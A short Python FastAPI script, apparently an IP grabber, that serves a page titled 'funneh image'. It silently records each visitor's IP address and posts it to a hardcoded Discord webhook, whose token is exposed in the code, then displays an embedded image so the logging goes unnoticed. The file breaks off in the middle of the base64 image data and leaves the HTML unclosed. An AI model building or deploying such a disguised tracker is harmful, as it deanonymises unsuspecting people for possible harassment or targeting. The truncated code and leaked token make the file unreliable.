from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import requests

app = FastAPI()

# Your Webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1508105125166846125/930vrRtV_IZxhSqTTxuBthH7sFWPOw_y8HIOZz9frJcW4wkBlT_l8JQv-e2H00I"

@app.get("/", response_class=HTMLResponse)
async def log_request(request: Request):
    # 1. Capture the IP
    client_ip = request.headers.get("x-forwarded-for", request.client.host)
    
    # 2. Log to Discord
    data = {"content": f"**New Visitor Detected!**\nIP Address: `{client_ip}`"}
    try:
        requests.post(WEBHOOK_URL, json=data, timeout=5)
    except:
        pass

    # 3. Show the image immediately (No button)
    return f"""
    <html>
        <head><title>funneh image</title></head>
        <body style="margin:0; background:black; display:flex; justify-content:center; align-items:center; height:100vh;">
            <img src="data:image/jpeg;base64,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
